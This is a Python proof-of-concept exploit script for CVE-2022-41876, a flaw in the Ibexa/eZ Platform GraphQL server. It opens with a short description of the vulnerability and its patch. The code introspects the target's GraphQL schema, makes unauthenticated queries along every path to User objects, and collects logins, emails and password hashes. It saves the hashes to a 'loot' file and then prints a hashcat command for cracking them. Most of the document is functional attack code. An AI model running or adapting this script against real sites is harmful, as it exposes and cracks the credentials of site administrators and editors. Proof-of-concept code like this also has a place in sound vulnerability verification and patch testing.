'''
ezplatform-graphql is a GraphQL server implementation for Ibexa DXP and Ibexa Open Source. Versions prior to 2.3.12 and 1.0.13 are subject to Insecure Storage of Sensitive Information. Unauthenticated GraphQL queries for user accounts can expose password hashes of users that have created or modified content, typically administrators and editors. This issue has been patched in versions 2.3.12, and 1.0.13 on the 1.X branch. Users unable to upgrade can remove the "passwordHash" entry from "src/bundle/Resources/config/graphql/User.types.yaml" in the GraphQL package, and other properties like hash type, email, login if you prefer.
'''
import requests
import sys
import os
import argparse
import json
from R2Log import logger
from R2Log import console
from rich.table import Table
from rich.live import Live

# Define the type to search for
TARGET_TYPE = 'User'


# Parse args
def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='CVE-2022-41876 POC')
    parser.add_argument('url', action='store', help='Target URL (specify the graphql endpoint)')
    parser.add_argument('-t', '--thread', action='store_true', help='Number of threads')
    parser.add_argument('-f', '--file', action='store', help='Local path to introspect file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    return parser.parse_args()


def prepare_table():
    # Create the results table
    table = Table(title="Contributor accounts found")
    table.add_column("Account id", justify="right", style="cyan", no_wrap=True)
    table.add_column("Name", justify="left", style="cyan", no_wrap=True)
    table.add_column("Login", justify="left", style="cyan", no_wrap=True)
    table.add_column("PasswordHash", justify="left", style="red", no_wrap=True)
    table.add_column("email", justify="left", style="cyan", no_wrap=True)
    table.add_column("Enabled", justify="left", style="cyan", no_wrap=True)
    table.add_column("maxLogin", justify="left", style="cyan", no_wrap=True)

    return table


def introspection_query(url, introspect):
    logger.info("Retrieving data from the specified url or file")

    if introspect:
        try:
            with open(introspect, "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            logger.error('The file "%s" does not exist' % introspect)
            sys.exit(1)
        except json.decoder.JSONDecodeError:
            logger.error('The file "%s" is not a correct JSON file' % introspect)
            sys.exit(1)
    else:
        r = requests.get('%s?query={__schema{types{name,fields{name,type{name}}}}}' % url)

        if r.status_code != 200:
            logger.error("The specified url returned status code %i" % r.status_code)
            logger.info("url = %s" % url)
            sys.exit(1)
        try:
            data = r.json()
        except requests.exceptions.JSONDecodeError:
            logger.error("Could not retrieve any JSON file from the specified endpoint.")
            logger.info("url = %s" % url)
            sys.exit(1)

    # Get the list of all types in the schema
    try:
        types = data['data']['__schema']['types']
    except KeyError:
        logger.error("JSON file retrieved from specified url or file is not of the expected introspect format")
        sys.exit(1)
    logger.success("Data retrieved successfully\n")

    logger.info("Retrieving paths to users' hashes")
    # Create a dictionary to store the fields of each type
    type_fields = {}
    for t in types:
        if not t['fields']:
            type_fields[t['name']] = []
        else:
            type_fields[t['name']] = [f['name'] for f in t['fields']]

    paths = find_paths('Domain', 'types', type_fields, types, set())
    logger.success("Paths retrieved successfully\n")

    return paths


# Define a recursive function to find paths to the target type
def find_paths(current_type, current_path, type_fields, types, visited_types):
    # Check if we have already visited this type
    if current_type in visited_types:
        return []

    # Add the current type to the visited types
    visited_types.add(current_type)

    # Check if we have reached the target type
    if current_type == TARGET_TYPE:
        return [current_path]

    # Check if the current type has any fields
    if not type_fields[current_type]:
        return []

    # Recursively search for paths to the target type
    paths = []
    for field in type_fields[current_type]:
        next_type = None
        for t in types:
            if t['name'] == current_type:
                for f in t['fields']:
                    if f['name'] == field:
                        next_type = f['type']['name']
                        break
                break
        if next_type is not None:
            next_path = current_path + '.' + field
            next_paths = find_paths(next_type, next_path, type_fields, types, visited_types.copy())
            paths.extend(next_paths)

    return paths


def get_user_info(data):
    users = []
    if isinstance(data, list):
        for elem in data:
            users.append(get_user_info(elem))
        return users
    elif isinstance(data, dict):
        if "id" in data:
            return (data["id"], data["name"], data["login"], data["passwordHash"], data["email"], data["enabled"], data["maxLogin"])
        else:
            return get_user_info(data[list(data.keys())[0]])


def main():
    args = parse_args()
    url = args.url
    introspect = args.file

    if 'graphql' not in url:
        logger.warning('The specified url does not contain "/graphql"\n')

    table = prepare_table()

    # Find all paths to the target type starting from the domain root
    paths = introspection_query(url, introspect)
    os.makedirs(os.path.dirname("./loot/hashes"), exist_ok=True)

    with Live(table, refresh_per_second=4, console=console) as live:
        with open("./loot/hashes.txt", "a+") as loot_file:
            logger.info('Retrieving hashes from found paths\n')
            found_users = []
            errors = 0
            error_displayed = False
            for path in paths:
                table.caption = "  [yellow3]Request[/]: %d/%d (%3.1f%%)" % (paths.index(path), len(paths), round(paths.index(path) / len(paths) * 100, 1))
                path = path.replace("types.", "{")
                path = path.replace(".", "{") + "{id,name,login,passwordHash,email,enabled,maxLogin"
                path += "}" * path.count("{")
                response = requests.get('%s?query=%s' % (url, path))
                if response.status_code == 200:
                    user_data = response.json()
                    if "passwordHash" in str(user_data):
                        extract = get_user_info(user_data)
                        if isinstance(extract, list):
                            for users in extract:
                                if not users[0] in found_users:
                                    found_users.append(users[0])
                                    loot_file.write(users[3]+"\n")
                                    table.add_row(str(users[0]), users[1], users[2], users[3], users[4], str(users[5]), str(users[6]))
                        else:
                            if not extract[0] in found_users:
                                found_users.append(extract[0])
                                loot_file.write(extract[3]+"\n")
                                table.add_row(str(extract[0]), extract[1], extract[2], extract[3], extract[4], str(extract[5]), str(extract[6]))
                else:
                    errors += 1
                    error_rate = round(errors / len(paths) * 100, 1)
                    if error_rate > 5 and not error_displayed:
                        logger.warning("There is more than 5% error in server responses, check if the specified url is a valid graphql endpoint")
                        logger.warning("url = %s\n" % url)
                        error_displayed = True
                    continue
                live.update(table)
    logger.info("It is possible to crack the hashes found with the following hashcat command:")
    console.print("{}hashcat --hash-type 3200 ./loot/hashes.txt $(fzf-wordlists){}\n".format("[bold green]", "[/bold green]"))
    console.print("{}Install {}Exegol{} or replace '$(fzf-wordlists)' with the path to your wordlist{}".format("[italic]", "[bold red]", "[/][italic]", "[/]"))


if __name__ == '__main__':
    main()

